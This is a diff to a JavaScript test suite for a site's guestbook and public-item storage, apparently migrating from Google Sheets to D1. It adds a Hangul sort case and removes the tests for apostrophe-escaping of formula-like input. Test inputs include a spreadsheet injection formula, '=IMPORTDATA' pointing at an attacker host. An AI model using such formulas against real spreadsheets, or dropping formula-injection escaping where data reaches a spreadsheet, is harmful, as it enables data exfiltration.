@@ -74,26 +74,28 @@ test('public asset overrides deliberately include visible, hidden and deleted me
   assert.equal(records[0].sortOrder, 4.5);
 });
 
-test('public things filter hidden and idless rows, project fields and sort by order/title/id', async (t) => {
+test('public things filter hidden and idless rows, project fields and sort by order, Korean title order and id', async (t) => {
   const f = await fixture(t);
   await f.seed('things', [
     { id: 'z', title: 'Zulu', status: 'visible', sortOrder: 20, internalNote: 'secret' },
     { id: 'hidden', status: 'hidden', sortOrder: -1 },
     { id: 'b', title: 'Alpha', status: 'visible', sortOrder: 20, imageUrl: 'https://images.test/a.png' },
     { id: 'a', title: 'Alpha', status: 'visible', sortOrder: 20 },
+    { id: 'hangul', title: '공든탑', status: 'visible', sortOrder: 20 },
     { id: 'first', title: 'First', status: 'visible', sortOrder: '' },
     { id: '', title: 'No id', status: 'visible', sortOrder: -2 }
   ]);
   const records = await f.call('thing.listPublic');
-  assert.deepEqual(records.map((r) => r.id), ['first', 'a', 'b', 'z']);
+  // Production Apps Script listed 공든탑 before Anniary: Hangul sorts before Latin.
+  assert.deepEqual(records.map((r) => r.id), ['first', 'hangul', 'a', 'b', 'z']);
   assert.deepEqual(Object.keys(records[0]).sort(), ['description', 'id', 'imageUrl', 'sortOrder', 'status', 'title', 'updatedAt', 'url']);
-  assert.equal(records[2].imageUrl, 'https://images.test/a.png');
+  assert.equal(records[3].imageUrl, 'https://images.test/a.png');
   assert.equal(records[0].sortOrder, 0);
   assert.equal(JSON.stringify(records).includes('internalNote'), false);
   assert.equal((await f.admin('admin.thing.list'))[0].internalNote, 'secret');
 });
 
-test('guestbook defaults and trimming, UTF-16 length limits and legacy literal-text protection match Code.js', async (t) => {
+test('guestbook defaults and trimming, UTF-16 length limits match Code.js and text is stored as typed', async (t) => {
   const f = await fixture(t);
   const entry = await f.create({ name: '   ', message: '  안녕하세요  ' });
   assert.equal(entry.name, 'ㅇㅁ'); assert.equal(entry.message, '안녕하세요');
@@ -102,7 +104,9 @@ test('guestbook defaults and trimming, UTF-16 length limits and legacy literal-t
   const formula = await f.create({ name: '+SUM(A1:A2)', message: '=IMPORTDATA("https://attacker.test")' });
   assert.equal(formula.name, '+SUM(A1:A2)'); assert.equal(formula.message[0], '=');
   const stored = (await f.rows('guestbook_entries'))[2];
-  assert.equal(stored.name, "'+SUM(A1:A2)"); assert.equal(stored.message, "'" + formula.message);
+  // Sheets dropped Code.js's protective apostrophe on read; D1 must not keep one either.
+  assert.equal(stored.name, '+SUM(A1:A2)'); assert.equal(stored.message, formula.message);
+  assert.deepEqual((await f.call('guestbook.listPublic')).map((entry) => entry.message).slice(-1), [formula.message]);
   assert.equal(stored.passwordHashAlgorithm, 'SHA-256+salt+pepper');
   assert.equal(stored.passwordHashIterations, 1);
   assert.equal(stored.passwordHash, sha(`${stored.passwordSalt}:delete-password:${GUESTBOOK_PEPPER}`));
@@ -344,7 +348,7 @@ test('admin and storage asset saves replace rows with the same updatedAt and val
   assert.equal((await f.call('assetOverride.listPublic'))[0].description, '');
 });
 
-test('thing mutations immediately change public projection and preserve legacy control/title/literal validation', async (t) => {
+test('thing mutations immediately change public projection, keep control/title validation and store text as typed', async (t) => {
   const f = await fixture(t);
   const value = { title: ' New thing ', description: 'description', url: 'https://example.test', imageUrl: 'https://image.test/one.png', status: 'visible', sortOrder: 10 };
   const thing = await f.admin('admin.thing.save', { thing: value });
@@ -355,7 +359,8 @@ test('thing mutations immediately change public projection and preserve legacy c
   await contentError(f, 'admin.thing.save', { token: f.session(), thing: { ...value, url: 'https://a..test/' } }, /valid hostname/);
   const formula = await f.admin('admin.thing.save', { thing: { ...value, title: '=HYPERLINK("https://test")', description: '@SUM(A1:A2)' } });
   assert.equal(formula.description, '@SUM(A1:A2)');
-  assert.equal((await f.admin('admin.thing.list'))[1].description, "'@SUM(A1:A2)");
+  assert.equal((await f.admin('admin.thing.list'))[1].description, '@SUM(A1:A2)');
+  assert.equal((await f.admin('admin.thing.list'))[1].title, '=HYPERLINK("https://test")');
   assert.deepEqual(await f.admin('admin.thing.delete', { ids: [thing.id, 'missing'] }), { deletedIds: [thing.id], alreadyMissingIds: ['missing'] });
   assert.deepEqual(await f.admin('admin.thing.delete', { ids: [thing.id] }), { deletedIds: [], alreadyMissingIds: [thing.id] });
 });
